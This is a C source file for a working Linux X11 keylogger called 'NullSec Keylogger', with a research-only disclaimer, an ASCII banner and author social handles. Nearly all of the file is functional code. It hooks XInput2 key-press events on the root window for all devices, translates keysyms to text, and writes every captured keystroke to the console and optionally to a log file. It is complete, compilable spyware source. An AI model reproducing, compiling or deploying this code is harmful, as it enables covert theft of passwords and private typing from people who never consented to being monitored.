/*
 * NullSec Keylogger (Educational/Research Only)
 * Linux X11 keyboard event monitor
 * Author: bad-antics | Twitter: @AnonAntics | Discord: discord.gg/killers
 * 
 * WARNING: For authorized security testing and educational purposes only.
 * Unauthorized use is illegal. Always obtain proper authorization.
 * 
 * Compile: gcc -o nullsec-keylogger nullsec-keylogger.c -lX11
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/extensions/XInput2.h>

#define VERSION "1.0.0"
#define MAX_LOG_SIZE 1048576

const char* BANNER = 
"╔═══════════════════════════════════════════════════════════╗\n"
"║     ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗   ║\n"
"║     ████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝   ║\n"
"║     ██╔██╗ ██║██║   ██║██║     ██║     ███████╗█████╗     ║\n"
"║     ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██╔══╝     ║\n"
"║     ██║ ╚████║╚██████╔╝███████╗███████╗███████║███████╗   ║\n"
"║     ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝   ║\n"
"║               KEYLOGGER (C/X11) - RESEARCH ONLY           ║\n"
"║            bad-antics | @AnonAntics | discord.gg/killers  ║\n"
"╚═══════════════════════════════════════════════════════════╝\n";

static volatile int running = 1;
static FILE *logfile = NULL;
static Display *display = NULL;

void signal_handler(int sig) {
    running = 0;
    printf("\n[*] Received signal %d, shutting down...\n", sig);
}

void cleanup(void) {
    if (logfile) {
        fclose(logfile);
        logfile = NULL;
    }
    if (display) {
        XCloseDisplay(display);
        display = NULL;
    }
}

const char* get_key_name(KeySym keysym) {
    static char buffer[32];
    
    // Special keys
    switch(keysym) {
        case XK_Return:     return "[ENTER]";
        case XK_BackSpace:  return "[BACKSPACE]";
        case XK_Tab:        return "[TAB]";
        case XK_Escape:     return "[ESC]";
        case XK_space:      return " ";
        case XK_Delete:     return "[DEL]";
        case XK_Home:       return "[HOME]";
        case XK_End:        return "[END]";
        case XK_Page_Up:    return "[PGUP]";
        case XK_Page_Down:  return "[PGDN]";
        case XK_Up:         return "[UP]";
        case XK_Down:       return "[DOWN]";
        case XK_Left:       return "[LEFT]";
        case XK_Right:      return "[RIGHT]";
        case XK_Shift_L:
        case XK_Shift_R:    return "";
        case XK_Control_L:
        case XK_Control_R:  return "";
        case XK_Alt_L:
        case XK_Alt_R:      return "";
        case XK_Caps_Lock:  return "[CAPS]";
        default: break;
    }
    
    // Printable characters
    if (keysym >= 32 && keysym <= 126) {
        buffer[0] = (char)keysym;
        buffer[1] = '\0';
        return buffer;
    }
    
    // Function keys
    if (keysym >= XK_F1 && keysym <= XK_F12) {
        snprintf(buffer, sizeof(buffer), "[F%ld]", keysym - XK_F1 + 1);
        return buffer;
    }
    
    return "";
}

void log_key(const char *key, int to_file) {
    time_t now;
    struct tm *tm_info;
    char timestamp[64];
    
    time(&now);
    tm_info = localtime(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
    
    if (strlen(key) > 0) {
        printf("%s", key);
        fflush(stdout);
        
        if (to_file && logfile) {
            fprintf(logfile, "%s", key);
            fflush(logfile);
        }
    }
}

int main(int argc, char *argv[]) {
    printf("%s\n", BANNER);
    
    int to_file = 0;
    char *output_file = NULL;
    
    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-o") == 0 && i + 1 < argc) {
            to_file = 1;
            output_file = argv[++i];
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("Usage: %s [-o <output_file>]\n", argv[0]);
            printf("\nOptions:\n");
            printf("  -o <file>    Log keystrokes to file\n");
            printf("  -h, --help   Show this help\n");
            printf("\nWARNING: For authorized testing only!\n");
            return 0;
        }
    }
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    atexit(cleanup);
    
    // Open display
    display = XOpenDisplay(NULL);
    if (!display) {
        fprintf(stderr, "[-] Cannot open X display\n");
        return 1;
    }
    
    // Check for XInput2 extension
    int xi_opcode, event, error;
    if (!XQueryExtension(display, "XInputExtension", &xi_opcode, &event, &error)) {
        fprintf(stderr, "[-] XInput extension not available\n");
        return 1;
    }
    
    // Open log file if requested
    if (to_file) {
        logfile = fopen(output_file, "a");
        if (!logfile) {
            fprintf(stderr, "[-] Cannot open log file: %s\n", output_file);
            return 1;
        }
        printf("[*] Logging to: %s\n", output_file);
    }
    
    printf("[*] Keylogger started. Press Ctrl+C to stop.\n");
    printf("[*] Captured keys:\n\n");
    
    // Select XI events
    Window root = DefaultRootWindow(display);
    XIEventMask mask;
    mask.deviceid = XIAllDevices;
    mask.mask_len = XIMaskLen(XI_LASTEVENT);
    mask.mask = calloc(mask.mask_len, sizeof(char));
    XISetMask(mask.mask, XI_KeyPress);
    
    XISelectEvents(display, root, &mask, 1);
    XSync(display, False);
    free(mask.mask);
    
    // Main event loop
    while (running) {
        XEvent event;
        XGenericEventCookie *cookie = &event.xcookie;
        
        XNextEvent(display, &event);
        
        if (XGetEventData(display, cookie) && 
            cookie->type == GenericEvent && 
            cookie->extension == xi_opcode) {
            
            if (cookie->evtype == XI_KeyPress) {
                XIDeviceEvent *dev_event = cookie->data;
                KeySym keysym = XkbKeycodeToKeysym(display, dev_event->detail, 0, 
                    dev_event->mods.effective & ShiftMask ? 1 : 0);
                
                const char *key = get_key_name(keysym);
                log_key(key, to_file);
            }
            XFreeEventData(display, cookie);
        }
    }
    
    printf("\n\n[*] Keylogger stopped.\n");
    return 0;
}
